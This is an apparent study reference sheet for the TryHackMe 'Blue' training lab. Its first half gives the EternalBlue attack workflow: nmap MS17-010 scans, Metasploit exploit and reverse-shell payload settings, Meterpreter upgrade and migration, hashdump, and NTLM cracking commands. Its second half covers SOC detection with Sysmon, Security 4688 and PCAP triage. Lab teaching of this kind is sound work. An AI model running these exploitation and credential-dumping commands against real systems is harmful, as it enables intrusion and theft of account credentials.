# 🛡️ Blue — Reference Sheet

**Learning path:** SOC Level 1 → 13. SIEM Triage for SOC → Log Analysis with SIEM → Prerequisite: Blue  
**Original room:** https://tryhackme.com/room/blue  
**Tags:** `windows` · `smb` · `ms17-010` · `eternalblue` · `metasploit` · `meterpreter` · `soc` · `dfir`

> **TL;DR:** The original **Blue** TryHackMe lab demonstrates reconnaissance of a vulnerable Windows SMBv1 host, exploitation of **MS17-010 (EternalBlue)**, a Windows shell, Meterpreter, SYSTEM-level access, hash analysis, and three flags. From the SOC perspective, examine **SMB traffic on TCP/445**, vulnerable-host exposure, suspicious **post-exploitation process activity**, unexpected outbound connections, and credential-access telemetry. Neither an open port nor a single event is proof of successful exploitation.

**Evidence note:** Sections 1–5 summarize the existing CS101 Blue reference sheet; Sections 6–8 are **supplemental SOC/DFIR guidance**, not findings extracted from a Blue lab event log. All examples explicitly described as *illustrative* are hypothetical.

## ⚠️ Gotchas

| Gotcha | Detail |
|---|---|
| No ICMP response does not mean host is offline | The Blue VM may not respond to ping. An authorized `-Pn` TCP scan can still be appropriate. |
| MS17-010 is a bulletin, not a unique CVE | The 2017 Microsoft update covers multiple SMBv1 vulnerabilities; EternalBlue is associated with CVE-2017-0144. |
| TCP/445 open is not a vulnerability finding | Confirm SMBv1 support and patch state separately. |
| `--script vuln` is broad | The original note uses it; targeted `smb-vuln-ms17-010` is more focused in a lab. |
| `RHOSTS` vs `LHOST` | Target address vs a reachable callback/listener address. |
| Shell upgrade requires `SESSION` | `OptionValidateError: SESSION` means the post module needs the correct session ID. |
| Meterpreter ≠ Windows CMD | `getuid` and `migrate` are Meterpreter commands; `whoami` is a Windows shell command. |
| Privilege context must be checked | Do not assume the exploit started as a low-privilege user or that `getsystem` was needed. |
| Some lab sessions or flags are unstable | Source notes suggest retrying/restarting a disposable VM; do not do this against production. |
| Sysmon telemetry depends on installation/config | Sysmon ID 1/3 may help after compromise; they may not identify the SMB exploit itself. |
| Windows versions differ | Modern `Get-WinEvent`, SMB cmdlets, and audit policy may not be available on legacy systems. |
| Password hashes are sensitive | Collect or analyze only explicit lab/authorized material; omit credentials from public notes. |

## 1️⃣ Reconnaissance — Identify MS17-010

**Source-derived workflow:** Start the Blue target and AttackBox, scan the host, and identify SMBv1/MS17-010 exposure. The source cautions that ICMP requests can fail.

### Quick-Ref — Reconnaissance

| Type | OS | Priv | Command | What | Example |
|---|---|---|---|---|---|
| Inspect | Linux | User | `ip addr` | Identify AttackBox interfaces | Check listener IP |
| Inspect | Linux | User | `nmap -sV -vv --script vuln <TARGET_IP>` | Broad Nmap version and vulnerability scan (original note) | Look for MS17-010 detection |
| Inspect | Linux | User | `nmap -Pn -p 445 --script smb-vuln-ms17-010 <TARGET_IP>` | Targeted check in an authorized lab (added) | SMB vulnerability test |
| Inspect | Linux | User | `nmap -Pn -p 445 -sV <TARGET_IP>` | Check SMB port without ICMP host discovery | TCP/445 status |

```bash
# Run only against your designated TryHackMe lab target.
nmap -sV -vv --script vuln <TARGET_IP>

# Supplemental focused check (not in the original note):
nmap -Pn -p 445 --script smb-vuln-ms17-010 <TARGET_IP>
```

**Command explanation:** `-sV` detects service versions; `-vv` increases verbosity; `--script vuln` calls the broad vulnerability-script category; `--script smb-vuln-ms17-010` runs an MS17-010-specific checker; `-Pn` skips ping discovery; `-p 445` restricts the port.

**Concrete example:** In Blue, a positive SMB vulnerability finding motivates the next lab task. In real SOC work, a scan result is *exposure evidence*—not proof that anyone exploited the system.

## 2️⃣ Gaining Access — Metasploit (Authorized Blue Lab)

**Source-derived workflow:** Use `exploit/windows/smb/ms17_010_eternalblue` with the Blue training VM. These commands are preserved as **historical lab notes**, not a recommendation to exploit a production system.

| Type | OS | Priv | Command | What | Example |
|---|---|---|---|---|---|
| Config | Linux/Metasploit | User | `set LHOST <ATTACKBOX_IP>` | Set reachable callback address | Lab interface IP |
| Config | Linux/Metasploit | User | `set RHOSTS <TARGET_IP>` | Configure target Windows host | Blue VM IP |
| Config | Linux/Metasploit | User | `set payload windows/x64/shell/reverse_tcp` | Select the 64-bit lab reverse-shell payload | Windows shell |
| Execute | Linux/Metasploit | User | `run` | Execute selected lab module | New shell if successful |
| Inspect | Linux/Metasploit | User | `search ms17_010` | Search Metasploit modules | EternalBlue |
| Inspect | Linux/Metasploit | User | `show options` | View required/current settings | Find `RHOSTS` |
| Launch | Linux | User | `msfconsole` | Open Metasploit | Interactive console |
| Select | Linux/Metasploit | User | `use exploit/windows/smb/ms17_010_eternalblue` | Select the SMB exploit module | Blue's vulnerable host |

```text
# AttackBox shell:
msfconsole

# Metasploit prompt:
search ms17_010
use exploit/windows/smb/ms17_010_eternalblue
show options
set RHOSTS <TARGET_IP>
set LHOST <ATTACKBOX_IP>
set payload windows/x64/shell/reverse_tcp
run
```

**Example and gotcha:** The source says the lab VM may take time to boot and an initial shell may not be responsive. Check the target and listener settings before retrying on the disposable training VM.

## 3️⃣ Shell-to-Meterpreter, Privileges, and Migration

**Source-derived workflow:** Background the shell, convert it using `post/multi/manage/shell_to_meterpreter`, inspect identity, and optionally migrate to a process in the authorized lab.

| Type | OS | Priv | Command | What | Example |
|---|---|---|---|---|---|
| Execute | Linux/Metasploit | User | `run` | Run shell-to-Meterpreter post module | New Meterpreter session |
| Inspect | Linux/Metasploit | User | `sessions -l` | Enumerate sessions | Find valid session ID |
| Inspect | Windows/Meterpreter | Mixed | `getuid` | Print Meterpreter identity | `NT AUTHORITY\SYSTEM` |
| Inspect | Windows/Meterpreter | Mixed | `ps` | List current processes | Find process PID |
| Inspect | Windows shell | Mixed | `whoami` | Print Windows account | Verify effective identity |
| Select | Linux/Metasploit | User | `use post/multi/manage/shell_to_meterpreter` | Load post module | Upgrade shell |
| Session | Linux/Metasploit | User | `background` | Return to framework prompt | Configure another module |
| Session | Linux/Metasploit | User | `sessions -i <ID>` | Interact with a chosen session | Attach Meterpreter |
| Set | Linux/Metasploit | User | `set SESSION <ID>` | Set required session option | `set SESSION 1` |
| Session | Windows/Meterpreter | Admin | `migrate <PID>` | Migrate within lab to accessible process | Stable process |

```text
background
sessions -l
use post/multi/manage/shell_to_meterpreter
set SESSION <ID>
show options
run
sessions -l
sessions -i <NEW_ID>

# Meterpreter prompt:
getuid
ps
# Optional, only inside authorized lab:
migrate <PID>

# Windows shell, if needed:
whoami
```

**Source-specific gotcha:** If `SESSION` is not configured correctly, the post module can raise a validation error. If migration fails, inspect the target's architecture, rights, and process context; do not assume every process is migratable.

## 4️⃣ Hash Analysis — Authorized Lab Only

**Source-derived workflow:** The source discusses privileged `hashdump` output, identifying the non-default local account, and using John/Hashcat on artificial or authorized NTLM material. The original Markdown does **not** record a verified cracked password.

| Type | OS | Priv | Command | What | Example |
|---|---|---|---|---|---|
| Analyze | Linux | User | `hashcat -m 1000 ntlm_hashes.txt wordlist.txt` | Analyze NTLM-only hashes with Hashcat | Training hash |
| Analyze | Linux | User | `john --format=NT hash.txt` | Analyze lab NTLM hash material with John | Lab password exercise |
| Inspect | Windows/Meterpreter | Admin | `hashdump` | Read local SAM hash material in authorized lab | Username/RID/hash row |

**Example format (placeholder only):** `username:RID:LMHASH:NTHASH:::`. A full pwdump-style row may need preprocessing before using Hashcat, whereas a plain NTLM hash file is appropriate for the example shown.

**SOC interpretation:** Account hash access after unexpected SMB activity is potentially significant. Look for EDR credential-theft alerts and available forensic evidence; do not equate a single process access event with confirmed successful dumping.

## 6️⃣ SOC/DFIR Extension — What Would the Defender Detect?

> The following is **additional defensive interpretation**, not observed forensic evidence from the source Blue walkthrough.

### Cyber Kill Chain and detection opportunities

| Attack stage | Blue source activity | Potential log/evidence source | Detective question |
|---|---|---|---|
| Reconnaissance | Nmap / SMB check | Firewall/IDS, network flow logs | Were there repeated unusual connections to TCP/445? |
| Exploitation | MS17-010 SMB exploit | IDS SMB exploit signatures, PCAP, host patch inventory | Did suspicious SMB requests target an actually vulnerable host? |
| Execution | Windows shell | Sysmon **1** (if enabled), Security **4688** (if enabled), EDR | Was an unexpected shell/process launched? |
| Command & Control | Reverse callback/Meterpreter | Sysmon **3** (if enabled), firewall/proxy/EDR | Did a process initiate an unusual outbound session? |
| Privilege context | SYSTEM-level activity | Process creation, token/EDR telemetry | Was a new privileged process or unusual context observed? |
| Credential Access | SAM/NTLM hash study | EDR detections and relevant privileged access evidence | Was sensitive credential material accessed? |
| Collection | Flag-location browsing | File access auditing/EDR, if configured | Which files were accessed after compromise? |

### Critical monitoring limitations

- **SMB exploit may execute within kernel/network service context.** A Windows user-mode process event does not necessarily identify the exploitation itself.
- **Sysmon ID 1** provides process creation; **ID 3** provides network events *only if configured*. **Security 4688** requires process-creation auditing, and command-line details require separate configuration.
- **Destination port 445, a reverse shell, or an administrative process each has benign alternatives.** Correlate multiple independent signals.
- **Vulnerability state:** validate SMBv1 availability, system build, and applicable updates. A `Get-HotFix` listing by itself is not a definitive MS17-010 check.

## 7️⃣ SOC Commands — Defensive Triage

**Scope:** these supplemental commands are **read-only** and intended for compatible analyst or monitored Windows/Linux systems. They may not work on the legacy Blue VM; event-log reading may require admin/Event Log Readers membership.

| Type | OS | Priv | Command | What | Example |
|---|---|---|---|---|---|
| Event | Windows | Mixed | `Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=4688]]' -MaxEvents 20` | Process creation auditing | Unexpected command interpreter |
| Event | Windows | Mixed | `Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 20` | Recent Sysmon events | Process/network pivot |
| Filter | Windows | Mixed | `Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational';Id=1,3;StartTime=(Get-Date).AddHours(-24)}` | 24-hour process/connection timeline | Compare creation and callback |
| Inspect | Linux | User | `tcpdump -nn -r traffic.pcap 'tcp port 445'` | Read SMB packets in existing PCAP | SMB conversation |
| Inspect | Linux | User | `tshark -r traffic.pcap -Y 'tcp.port == 445'` | Display captured SMB transport traffic | Identify scanner and target |
| Inspect | Windows | Mixed | `Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol` | Inspect SMBv1 server setting where supported | Exposure check |
| Inspect | Windows | User | `Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20` | Inspect reported updates | Patch triage, not proof |
| Inspect | Windows | User | `Get-NetTCPConnection -LocalPort 445 -State Listen` | Check SMB listeners on modern Windows | TCP/445 exposure |

### Example A — Process plus network correlation

```powershell
$start = (Get-Date).AddHours(-24)
Get-WinEvent -FilterHashtable @{
    LogName   = 'Microsoft-Windows-Sysmon/Operational'
    Id        = 1,3
    StartTime = $start
} | Select-Object TimeCreated, Id, MachineName, Message
```

**Explanation:** Review ID 1 and ID 3 around the suspicious SMB traffic, pivoting on `ProcessGuid` and parent/child process relationships. An outgoing session is suspicious only with context.

### Example B — Windows Security process events

```powershell
Get-WinEvent -LogName Security -FilterXPath '*[System[EventID=4688]]' -MaxEvents 20 |
    Select-Object TimeCreated, Id, Message
```

**Explanation:** When auditing is active, ID 4688 can expose unexpected command execution. Command-line logging is a separate policy and may be blank.

### Example C — Offline SMB packet investigation

```bash
tshark -r traffic.pcap -Y 'tcp.port == 445' \
  -T fields -e frame.time -e ip.src -e ip.dst
```

**Explanation:** Extract endpoints/timestamps from a **previously acquired** capture. TCP/445 traffic alone does not fingerprint EternalBlue; use IDS signatures, packet analysis, and host evidence to test the exploit hypothesis.

### Example D — SMBv1 and patch visibility

```powershell
# Use only on compatible modern Windows hosts.
Get-SmbServerConfiguration | Select-Object EnableSMB1Protocol
Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20
```

**Explanation:** Determine SMBv1 server configuration and review patch history; older OSes and superseding cumulative updates require other verification methods.

## 8️⃣ Worked Investigation — Illustrative SOC Case

**Scenario (hypothetical; not from Blue logs):** IDS flags unusual requests to TCP/445 targeting a legacy Windows machine.

1. **Validate alert:** confirm source IP, destination host, timestamps, and IDS signature.
2. **Assess exposure:** verify supported SMB protocol versions and applicable MS17-010 fixes.
3. **Investigate follow-on execution:** look for unexpected shells/processes with EDR, Sysmon ID 1, or Security 4688.
4. **Pivot to outbound connections:** correlate those processes with Sysmon ID 3 or network telemetry.
5. **Investigate credential access:** inspect EDR/security findings; do not assume one LSASS event proves theft.
6. **Report confidence:** separate `attempted exploitation`, `confirmed compromise`, and `insufficient evidence`. Preserve UTC timestamps, host IDs, process GUIDs, and raw event evidence.

**Illustrative analyst summary:** “The target received anomalous SMB traffic and subsequently created an unexpected command interpreter that connected to an unfamiliar external host. Evidence supports escalation for investigation; successful MS17-010 exploitation is not yet established without additional network and host corroboration.”

## 🎯 Key Takeaways

- **Blue's learning flow:** recon → EternalBlue lab exploit → shell/Meterpreter → privilege checks → hash analysis → flags.
- **Blue-team focus:** evaluate vulnerability exposure and **correlate** abnormal SMB traffic with host execution, callback, and credential-access evidence.
- **Remember:** Sysmon ID **1** (ProcessCreate), ID **3** (NetworkConnect), and Security ID **4688** (ProcessCreate audit) are useful only when present and configured.
- **Confirm before concluding:** a scan, an open port, and a successful exploit are **three different claims**.
- **Authorized labs only** for the offensive commands preserved from CS101.
